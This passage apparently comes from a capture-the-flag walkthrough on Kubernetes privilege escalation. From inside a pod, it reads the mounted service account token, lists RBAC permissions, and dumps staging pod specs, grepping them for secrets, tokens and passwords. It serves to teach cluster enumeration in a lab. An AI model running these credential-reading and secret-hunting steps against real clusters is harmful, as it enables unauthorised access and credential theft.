### Phase 2: Identity & Permissions (RBAC Enumeration)
Kubernets pods usually mount a default Service Account token. We need to find it and see what it allows us to do.

1. **Locate and inspect the Service Account Token:**

```bash
root@test:~# ls -la /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root           140 Apr 18 17:25 .
drwxr-xr-x    3 root     root          4096 Oct 26 19:59 ..
drwxr-xr-x    2 root     root           100 Apr 18 17:25 ..2026_04_18_17_25_09.1056202703
lrwxrwxrwx    1 root     root            32 Apr 18 17:25 ..data -> ..2026_04_18_17_25_09.1056202703
lrwxrwxrwx    1 root     root            13 Oct 26 19:59 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Oct 26 19:59 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Oct 26 19:59 token -> ..data/token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

2. **Check your permissions:**
   This is the most critical step. It tells the API server to list everything your current service account is allowed to do.
   
```bash
root@test:~# kubectl auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
pods                                            []                                     []               [get list watch]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
root@test:~# 
```

### Phase 3: Identifying the Exploitation Path

You do not have permission to read secrets, create new pods, or impersonate users. However, you **do** have `get`, `list`, and `watch` permissions on `pods`. 

In Kubernetes, read access to a Pod resource is often a goldmine. The Pod specification (the YAML/JSON definition) includes environment variables, command-line arguments, and volume configurations. Developers and administrators frequently make the mistake of hardcoding sensitive information directly into the pod spec.

Since the challenge tells us the flag is in `kube-system`, let's use our read access to hunt for it.

### List the Pods in `kube-system`
First, let's see what is actually running in the target namespace. Run this command:
```bash
root@test:~# kubectl get pods -n kube-system
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:staging:test-sa" cannot list resource "pods" in API group "" in the namespace "kube-system"
```

The command `kubectl auth can-i --list` defaults to showing you permissions for your *current* namespace. Because your identity is `system:serviceaccount:staging:test-sa`, your current namespace is `staging`. You have `get`, `list`, and `watch` permissions for pods in the **staging** namespace, but absolutely zero permissions in `kube-system`. 

We need to pivot laterally within our own neighborhood before we can go after the `kube-system` castle. 

Here is our new attack path: we are going to interrogate every pod in the `staging` namespace. We are looking for another pod that might have been carelessly configured with hardcoded secrets, privileged volume mounts, or credentials in its environment variables.

### Step 1: Enumerate the Local Neighborhood

List all the pods in your current namespace:

```bash
root@test:~# kubectl get pods
NAME   READY   STATUS    RESTARTS   AGE
test   1/1     Running   0          173d
```

### Step 2: Strip-Mine the Configurations

Once you see what else is running alongside you, dump the full YAML configuration for everything in the namespace. We are hunting for anything sensitive—especially environment variables, command-line arguments, or references to other service accounts.

Run this to dump all pod specs and scroll through the output:

```bash
root@test:~# kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"test","namespace":"staging"},"spec":{"containers":[{"image":"hustlehub.azurecr.io/test:latest","imagePullPolicy":"IfNotPresent","name":"test"}],"serviceAccountName":"test-sa"}}
    creationTimestamp: "2025-10-26T19:59:00Z"
    name: test
    namespace: staging
    resourceVersion: "407"
    uid: 4f0c0d93-f622-47ad-b040-3f784afcc7ac
  spec:
    containers:
    - image: hustlehub.azurecr.io/test:latest
      imagePullPolicy: IfNotPresent
      name: test
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9r88v
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: noder
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: test-sa
    serviceAccountName: test-sa
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-9r88v
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2025-10-26T19:59:19Z"
      status: "True"
      type: PodReadyToStartContainers
    - lastProbeTime: null
      lastTransitionTime: "2025-10-26T19:59:00Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2025-10-26T19:59:19Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2025-10-26T19:59:19Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2025-10-26T19:59:00Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://e4602154b08dd6b551d516d835212f57404d78eed27f81f13290f804fb19f4a3
      image: hustlehub.azurecr.io/test:latest
      imageID: hustlehub.azurecr.io/test@sha256:6c49ed1562fc0394f3e50549895776c5cac96524b011b8c4a26dea211e9d4610
      lastState: {}
      name: test
      ready: true
      restartCount: 0
      started: true
      state:
        running:
          startedAt: "2025-10-26T19:59:19Z"
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9r88v
        readOnly: true
        recursiveReadOnly: Disabled
    hostIP: 172.30.0.2
    hostIPs:
    - ip: 172.30.0.2
    phase: Running
    podIP: 10.42.0.2
    podIPs:
    - ip: 10.42.0.2
    qosClass: BestEffort
    startTime: "2025-10-26T19:59:00Z"
kind: List
metadata:
  resourceVersion: ""
root@test:~# 
```

Alternatively, if there are a lot of pods, you can grep for the juicy stuff:

```bash
root@test:~# kubectl get pods -o yaml | grep -iE "env|secret|token|password|auth|args|command|serviceaccount" -A 5 -B 5
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"test","namespace":"staging"},"spec":{"containers":[{"image":"hustlehub.azurecr.io/test:latest","imagePullPolicy":"IfNotPresent","name":"test"}],"serviceAccountName":"test-sa"}}
    creationTimestamp: "2025-10-26T19:59:00Z"
    name: test
    namespace: staging
    resourceVersion: "407"
    uid: 4f0c0d93-f622-47ad-b040-3f784afcc7ac
--
      name: test
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9r88v
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: noder
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: test-sa
    serviceAccountName: test-sa
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
--
    volumes:
    - name: kube-api-access-9r88v
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
--
      started: true
      state:
        running:
          startedAt: "2025-10-26T19:59:19Z"
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9r88v
        readOnly: true
        recursiveReadOnly: Disabled
    hostIP: 172.30.0.2
    hostIPs:
root@test:~# 
```